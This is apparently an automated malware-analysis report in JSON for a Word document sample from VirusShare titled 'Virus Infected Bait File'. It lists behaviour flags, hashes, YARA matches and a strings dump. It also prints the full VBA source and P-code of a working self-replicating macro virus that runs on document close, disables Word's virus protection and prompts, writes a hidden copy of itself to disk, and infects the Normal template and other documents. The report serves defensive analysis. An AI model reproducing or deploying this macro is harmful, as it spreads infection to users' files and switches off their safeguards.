{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "CodeModule": "May attempt to modify the VBA code",
            "Document_Close": "Runs when the Word document is closed",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Open": "May open a file",
            "Output": "May write to a file",
            "Print #": "May write to a file",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code"
        },
        "macro": "Private Sub Document_Close()\nOn Error Resume Next\ns = ActiveDocument.Saved\nApplication.EnableCancelKey = Not -1\nWith Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With\nRandomize\nIf Dir(\"c:\\Win386.msw\", 6) = \"\" Then\nOpen \"c:\\Win386.msw\" For Output As #1\nFor i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines\na = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)\nPrint #1, a\nNext i\nClose #1\nSetAttr \"c:\\Win386.msw\", 6\nEnd If\nIf NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> \"Private Sub Document_Close()\" Then\nSet t = NormalTemplate.VBProject.VBComponents.Item(1)\nElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> \"Private Sub Document_Close()\" Then\nSet t = ActiveDocument.VBProject.VBComponents.Item(1)\nElse\nt = \"\"\nEnd If\nIf t <> \"\" Then\nOpen \"c:\\Win386.msw\" For Input As #1\nIf LOF(1) = 0 Then GoTo q\ni = 1\nDo While Not EOF(1)\nLine Input #1, a\nt.CodeModule.InsertLines i, a\ni = i + 1\nLoop\nq:\nClose #1\nIf Left(ActiveDocument.Name, 8) <> \"Document\" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName\nEnd If\nIf Rnd(12) > 10 Then MsgBox \"\u00a4 Sorry, but I've InFeCtEd your PC \u00a4\", vbCritical, \"Mr. X\"\nIf ActiveDocument.Saved <> s Then ActiveDocument.Saved = s\nEnd Sub\n\n' Processing file: VirusShare_77f59faeb089bffb3fdf485aeb243947\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 3148 bytes\n' Line #0:\n' \tFuncDefn (Private Sub Document_Close())\n' Line #1:\n' \tOnError (Resume Next) \n' Line #2:\n' \tLd ActiveDocument \n' \tMemLd Saved \n' \tSt s \n' Line #3:\n' \tLitDI2 0x0001 \n' \tUMi \n' \tNot \n' \tLd Application \n' \tMemSt EnableCancelKey \n' Line #4:\n' \tStartWithExpr \n' \tLd Options \n' \tWith \n' \tBoS 0x0000 \n' \tLitDI2 0x0000 \n' \tMemStWith ConfirmConversions \n' \tBoS 0x0000 \n' \tLitDI2 0x0000 \n' \tMemStWith VirusProtection \n' \tBoS 0x0000 \n' \tLitDI2 0x0000 \n' \tMemStWith SaveNormalPrompt \n' \tBoS 0x0000 \n' \tEndWith \n' Line #5:\n' \tArgsCall Read 0x0000 \n' Line #6:\n' \tLitStr 0x000D \"c:\\Win386.msw\"\n' \tLitDI2 0x0006 \n' \tArgsLd Dir 0x0002 \n' \tLitStr 0x0000 \"\"\n' \tEq \n' \tIfBlock \n' Line #7:\n' \tLitStr 0x000D \"c:\\Win386.msw\"\n' \tLitDI2 0x0001 \n' \tSharp \n' \tLitDefault \n' \tOpen (For Output)\n' Line #8:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd MacroContainer \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tMemLd CountOfLines \n' \tFor \n' Line #9:\n' \tLd i \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd MacroContainer \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tSt a \n' Line #10:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLd a \n' \tPrintItemNL \n' Line #11:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tNextVar \n' Line #12:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tClose 0x0001 \n' Line #13:\n' \tLitStr 0x000D \"c:\\Win386.msw\"\n' \tLitDI2 0x0006 \n' \tArgsCall SetAttr 0x0002 \n' Line #14:\n' \tEndIfBlock \n' Line #15:\n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tLitStr 0x001C \"Private Sub Document_Close()\"\n' \tNe \n' \tIfBlock \n' Line #16:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tSet t \n' Line #17:\n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tLitStr 0x001C \"Private Sub Document_Close()\"\n' \tNe \n' \tElseIfBlock \n' Line #18:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tSet t \n' Line #19:\n' \tElseBlock \n' Line #20:\n' \tLitStr 0x0000 \"\"\n' \tSt t \n' Line #21:\n' \tEndIfBlock \n' Line #22:\n' \tLd t \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tIfBlock \n' Line #23:\n' \tLitStr 0x000D \"c:\\Win386.msw\"\n' \tLitDI2 0x0001 \n' \tSharp \n' \tLitDefault \n' \tOpen (For Input)\n' Line #24:\n' \tLitDI2 0x0001 \n' \tArgsLd LOF 0x0001 \n' \tLitDI2 0x0000 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tGoTo q \n' \tEndIf \n' Line #25:\n' \tLitDI2 0x0001 \n' \tSt i \n' Line #26:\n' \tLitDI2 0x0001 \n' \tArgsLd EOF 0x0001 \n' \tNot \n' \tDoWhile \n' Line #27:\n' \tLitDI2 0x0001 \n' \tLd a \n' \tLineInput \n' Line #28:\n' \tLd i \n' \tLd a \n' \tLd t \n' \tMemLd CodeModule \n' \tArgsMemCall InsertLines 0x0002 \n' Line #29:\n' \tLd i \n' \tLitDI2 0x0001 \n' \tAdd \n' \tSt i \n' Line #30:\n' \tLoop \n' Line #31:\n' \tLabel q \n' Line #32:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tClose 0x0001 \n' Line #33:\n' \tLd ActiveDocument \n' \tMemLd New \n' \tLitDI2 0x0008 \n' \tArgsLd LBound 0x0002 \n' \tLitStr 0x0008 \"Document\"\n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLd ActiveDocument \n' \tMemLd FullName \n' \tParamNamed FileName \n' \tLd ActiveDocument \n' \tArgsMemCall SaveAs 0x0001 \n' \tEndIf \n' Line #34:\n' \tEndIfBlock \n' Line #35:\n' \tLitDI2 0x000C \n' \tArgsLd Rnd 0x0001 \n' \tLitDI2 0x000A \n' \tGt \n' \tIf \n' \tBoSImplicit \n' \tLitStr 0x0024 \"\u00a4 Sorry, but I've InFeCtEd your PC \u00a4\"\n' \tLd vbCritical \n' \tLitStr 0x0005 \"Mr. X\"\n' \tArgsCall MsgBox 0x0003 \n' \tEndIf \n' Line #36:\n' \tLd ActiveDocument \n' \tMemLd Saved \n' \tLd s \n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLd s \n' \tLd ActiveDocument \n' \tMemSt Saved \n' \tEndIf \n' Line #37:\n' \tEndSub \n"
    },
    "filename": "VirusShare_77f59faeb089bffb3fdf485aeb243947",
    "filesize": 28160,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 5.0, Code page: 1252, Title: Virus Infected Bait File, Author: Joe Hartmann, Template: Normal, Last Saved By: MACRO, Revision Number: 2, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Tue Nov 14 19:25:00 2000, Last Saved Time/Date: Tue Nov 14 19:25:00 2000, Number of Pages: 1, Number of Words: 8, Number of Characters: 47, Security: 0",
    "hashes": {
        "md5": "77f59faeb089bffb3fdf485aeb243947",
        "sha1": "68805360663478c15cd29c0536994fa03dd01104",
        "sha256": "adf9c28624dcb03ceae0e74d84b9b5dfe89fd73c2ea49b18e777da0431a0e45e"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbj\u064e",
            "#upN",
            "Virus Infected Bait File",
            "Joe Hartmann - HAVS",
            "Virus Name: ",
            ". A!",
            "rKFrKF",
            "Virus Infected Bait File",
            "Joe Hartmann",
            "Normal",
            "MACRO",
            "Microsoft Word 8.0",
            "NopN",
            "NopN",
            "Virus Infected Bait File",
            "Title",
            "_PID_GUID",
            "#upN",
            "c:\\Win386.msw",
            "c:\\Win386.msw",
            "c:\\Win386.msw",
            "Private Sub Document_Close()",
            "Private Sub Document_Close()",
            "c:\\Win386.msw",
            "Document",
            " Sorry, but I've InFeCtEd your PC  ",
            "Mr. X",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VCreata",
            "`False",
            "Predecl",
            "xTru",
            "\"Expose",
            "Template Deriv",
            "$Customiz",
            "8 Sub ",
            "t_Cl",
            "On Erro r Res",
            " N@ext",
            "sPAct4",
            "jpplicat@ion.En",
            "ancelKey",
            "Not -1",
            "With Op",
            "s: .Con",
            "firm",
            "VirusProte",
            "6|on ",
            "End +",
            "Rand",
            "If Dir(\"",
            "c:\\Win38",
            "6.msw\", ",
            "\"\" Then",
            "rpen ",
            "=Output As #@-A",
            "1 To M",
            "acro@,tai@ner.VB\"j",
            "Compon",
            "s.Item(",
            "1)@8deMod",
            "untOfL",
            "(i, 1@j\tqnt), a",
            "/8Set",
            "@KUE",
            "5\"1\" <> \"]$ Ao*",
            "+?\u03c0*",
            "nt>C",
            "\",ft$",
            "PInO`",
            "L,OFI`F0BW G\"o@Qq",
            "Do Whi",
            "mREb",
            "3CtQInsetrtb\" @I",
            " + @^Loop0",
            "q:)I",
            "t(L!!, 8)w",
            "x`jF",
            "'z$SRnd",
            "(12) > 1",
            "MsgBox ",
            "\" Sorry",
            ",  I've",
            "FeCtEd ",
            "your PC ",
            "`~vbCrit",
            "l, \"Mr.\\ X@2",
            "ssC,",
            "= `w9",
            "73a1191b7",
            "|@FN\u04a48eT",
            "Wordk",
            "Win16~",
            "Win32",
            "HAVS1B",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Project-",
            "Documentj",
            "Document_Close7\\",
            "ActiveDocument\\",
            "Savedd",
            "Application*",
            "EnableCancelKey",
            "Options",
            "ConfirmConversions",
            "VirusProtectionoD",
            "SaveNormalPrompt\u02bc",
            "MacroContainer>",
            "VBProjectOh",
            "VBComponents",
            "Itemz",
            "CodeModule",
            "CountOfLines!\\",
            "Lines",
            "SetAttrC",
            "NormalTemplateq",
            "LOFc",
            "InsertLines",
            "SaveAsf;",
            "FileNamej",
            "FullName\u041e",
            "RndR",
            "MsgBoxR",
            "vbCritical+}",
            "Project",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINNT\\S",
            "ystem32\\",
            "c2.tlb#O",
            "LE Autom`ation",
            "mMSForms",
            "6694014-",
            "26E3-43B",
            "1-A33A-1",
            "9218",
            "3.TWD#M",
            "icrosoft ",
            "` Ob",
            " LibraryG",
            "P326417",
            "AA-D3AC-",
            "4CEE-900",
            "5-CCF119@13FC22D",
            "OCUME~1\\@ADMINI",
            "L OCALS",
            "Temp\\VBE\\E-",
            "EXg-.E",
            "Za*l",
            "}NDYa}",
            "j 0\t1C",
            "Offi",
            "j2DF8D04C-5BF@h",
            "01B-BDE5i",
            "97\\C",
            "=O9`7.DLLj",
            " (8.0j",
            "isDocument",
            "D@Dc",
            "ThisDocument",
            "ID=\"{DDE82283-556A-4098-8752-90BC6622BDF4}\"",
            "Document=ThisDocument/&H00000000",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"B0B27A787E787E787E787E\"",
            "DPB=\"C2C008981B991B991B\"",
            "GC=\"D4D61EB222C523C5233A\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=0, 0, 0, 0, C",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.290602",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
